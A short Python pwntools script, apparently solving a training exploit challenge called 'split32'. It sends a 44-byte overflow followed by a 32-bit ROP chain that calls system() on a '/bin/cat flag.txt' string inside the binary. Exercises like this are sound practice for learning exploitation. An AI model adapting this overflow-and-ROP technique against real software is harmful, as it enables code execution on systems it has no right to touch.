from pwn import *

system_plt = 0x8048430

# vaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
print_flag = 0x0804a030

# RIP offset is at 44
rop = "A" * 44

# Call system(char* print_flag)
rop += p32(system_plt)
rop += 'junk'
rop += p32(print_flag)

# Start process and send rop chain
e = process('/home/abatchy/Desktop/tmp/split32')
print e.recv()
e.sendline(rop)

# Print output
print e.recvall()
